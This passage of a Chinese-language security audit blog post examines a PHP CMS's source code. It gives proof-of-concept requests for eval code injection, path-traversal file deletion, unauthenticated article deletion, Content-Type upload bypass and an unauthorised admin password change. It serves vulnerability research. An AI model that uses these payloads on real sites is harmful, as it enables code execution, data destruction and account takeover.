class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//config/run.inc.php  </span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br><br>-&gt;<span class="hljs-title function_ invoke__">setAction</span>()<br><br><span class="hljs-comment">//public/class/Factory.class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Factory</span></span>&#123;<br>    ...<br><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<span class="hljs-comment">//$_a 是get传参，可控变量</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.<span class="hljs-string">&#x27;?a=login&#x27;</span>);<br>&#125;  <br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/controller/&#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action.class.php&#x27;</span>)) <span class="hljs-variable">$_a</span> = <span class="hljs-string">&#x27;Login&#x27;</span>;<span class="hljs-comment">//ucfirst(), 将字符串首字母转化为大写，file_exists() 函数检查文件是否存在，如果文件不存在就回退为 Login 控制器</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;self::$_obj = new &#x27;</span>.<span class="hljs-title function_ invoke__">ucfirst</span>(<span class="hljs-variable">$_a</span>).<span class="hljs-string">&#x27;Action();&#x27;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$_obj</span>;<br>&#125;<br>    ...<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1、绕过 file_exists（）</p><p>这个函数在进行检查时，比如&#x2F;controller&#x2F;admin;&#x2F;..&#x2F;，函数允许路径中有一些特殊字符，并且遇到&#x2F;..&#x2F;会返回到上级目录，可以利用这个绕过 file_exists（）函数检查。</p><p>那么我们构造poc:<code>Factory();phpinfo();//../</code></p><p>2、入口点</p><p>调用Factory() 的入口点在 Factory::setAction()-&gt;run(); 这里，在admin&#x2F;index.php 这个文件中得知，它包含了&#x2F;config&#x2F;run.inc.php，可以利用</p><p>3、POC</p><p><code>/admin?a=Factory();phpinfo();//../</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png" alt="20250710234248614"></p><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>根据审计PicAction.class.php时遇到的delall()函数，无验证造成的任意文件删除漏洞，进行复现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//上传目录的跟路径</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>来到对应的功能点：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png" alt="20250712193547260"></p><p>先给 upload 随便上传一张图片</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png" alt="20250712193717272"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png" alt="20250712193754284"></p><p>删除，进行抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png" alt="20250712193827895"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png" alt="20250712193843074"></p><p>URL编码：<code>pid%5B0%5D=1.png&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>解码：</p><p><code>pid[0]=1.png&amp;chkall=on&amp;send=删除选中图片</code></p><p><code>chkall=on</code>是一个复选框</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png" alt="20250712194432977"></p><p>可以看到只要在pid后的文件名进行路径拼接就可以跳到任意目录去删除文件</p><p>接下来就可以根据上面的数据构造POC：</p><p><code>pid[0]=/../1.txt&amp;chkall=on&amp;send=删除选中图片</code></p><p><code>pid%5B0%5D=/../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p><p>路由：admin&#x2F;?a&#x3D;pic&amp;m&#x3D;delall</p><p>在根目录准备一个1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png" alt="20250712194601104"></p><p>退出登录</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png" alt="20250712194749344"></p><p>POST传参：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png" alt="20250712195154540"></p><p>上图的浏览器删不掉，换了一个成功了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png" alt="20250712195540507"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png" alt="20250712195612613"></p><h3 id="任意文章-文件（no）删除"><a href="#任意文章-文件（no）删除" class="headerlink" title="任意文章&#x2F;文件（no）删除"></a>任意文章&#x2F;文件（no）删除</h3><p>这里想到审计ArticleAction.class.php时也有delall()函数，看看这里有没有文章删除漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//删除单个文章</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>]))&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(tool::<span class="hljs-title function_ invoke__">delete_file</span>(<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>())&#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertLocation</span>(<span class="hljs-literal">null</span>, tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;删除失败!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-comment">//删除多个文章</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何内容!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-comment">//$this-&gt;_model-&gt;id=implode(&#x27;,&#x27;,$_POST[&#x27;showid&#x27;]);</span><br><span class="hljs-comment">//echo $this-&gt;_model-&gt;id;</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$html</span>==<span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-variable">$html</span>=<span class="hljs-string">&#x27;0.html&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//先删除静态文件</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$html</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;静态文件删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=article&amp;m=index&#x27;</span>,<span class="hljs-number">5</span>);<br>&#125;<br>&#125;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">delete_article</span>();<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:&#x27;</span>.tool::<span class="hljs-title function_ invoke__">getPrevPage</span>());<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h4><p>GET传参，</p><p>找到一篇文章的id</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png" alt="20250712200511140"></p><p>构造POC：<code>admin/?a=article&amp;m=delete&amp;id=2450</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png" alt="20250712200604332"></p><p>执行后发现这篇文章被删除了</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png" alt="20250712200619491"></p><h4 id="delall"><a href="#delall" class="headerlink" title="delall()"></a>delall()</h4><p>功能点：此处多选删除</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png" alt="20250712201015073"></p><p>抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png" alt="20250712201031989"></p><p><code>showid%5B%5D=2449&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>同样的，构造POC：</p><p><code>showid%5B%5D=%2F..%2F1.txt&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p><p>路由：admin&#x2F;?a&#x3D;article&amp;m&#x3D;delall</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png" alt="20250712201614722"></p><p>但是只删除了文章并没有删除1.txt ？？</p><p>再认真分析一遍：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;showid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;id=<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//获取文章id</span><br><span class="hljs-variable">$_findOne</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">findOne</span>();<span class="hljs-comment">//数据库查询</span><br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_findOne</span>[<span class="hljs-number">0</span>]-&gt;html;<span class="hljs-comment">//从数据库中获取 HTML</span><br></code></pre></td></tr></table></figure><p>直接传递<code>/../1.txt</code>作为ID值，系统会将<code>/../1.txt</code>当作文章ID去数据库查询，显然这个ID不存在</p><p>想要利用这里的漏洞，只能去更改数据库中HTML的内容，</p><p>添加、修改、删除都进行了用户验证，所以这个也不算一个漏洞了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable">$html</span>=<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;html_temp&#x27;</span>]=<span class="hljs-variable">$_art</span>[<span class="hljs-number">0</span>]-&gt;html;<br></code></pre></td></tr></table></figure><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//处理上传图片</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upLoad</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>])) &#123;<br><span class="hljs-variable">$_logoupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogoUpload</span>(<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MAX_FILE_SIZE&#x27;</span>]);<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">960</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-comment">//echo $_path;</span><br><span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">alertOpenerClose</span>(<span class="hljs-string">&#x27;图片上传成功！&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>.<span class="hljs-variable">$_path</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;警告：文件过大或者其他未知错误导致浏览器崩溃！&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//构造方法，初始化</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$_file</span>,<span class="hljs-variable">$_maxsize</span></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;maxsize = <span class="hljs-variable">$_maxsize</span> / <span class="hljs-number">1024</span>;<br><span class="hljs-variable language_">$this</span>-&gt;type = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;type&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;path = ROOT_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.UPLOGO;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;tmp = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_file</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkType</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkPath</span>();<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">moveUpload</span>();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了</p><h3 id="任意文件上传-2"><a href="#任意文件上传-2" class="headerlink" title="任意文件上传-2"></a>任意文件上传-2</h3><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//xheditor编辑器专用上传</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">xhUp</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br><span class="hljs-variable">$_fileupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileUpload</span>(<span class="hljs-string">&#x27;filedata&#x27;</span>,<span class="hljs-number">10</span>);<br><span class="hljs-variable">$_err</span>=<span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">checkError</span>();<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_fileupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_msg</span>=<span class="hljs-string">&quot;&#x27;..<span class="hljs-subst">$_path</span>&#x27;&quot;</span>;<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">650</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&#123;&#x27;err&#x27;:&#x27;&quot;</span>.<span class="hljs-variable">$_err</span>.<span class="hljs-string">&quot;&#x27;,&#x27;msg&#x27;:&quot;</span>.<span class="hljs-variable">$_msg</span>.<span class="hljs-string">&quot;&#125;&quot;</span>;<br><span class="hljs-keyword">exit</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;警告：由于非法操作导致上传失败！&#x27;</span>);<br>&#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>代码中的文件名以时间+100到1000之间的随机数进行重命名</p><p>同样也是检查的传入的Content-Type的值</p><h3 id="未授权更改管理员账号密码"><a href="#未授权更改管理员账号密码" class="headerlink" title="未授权更改管理员账号密码"></a><strong>未授权更改管理员账号密码</strong></h3><p>首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息</p><p>根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br>            <span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                tool::<span class="hljs-title function_ 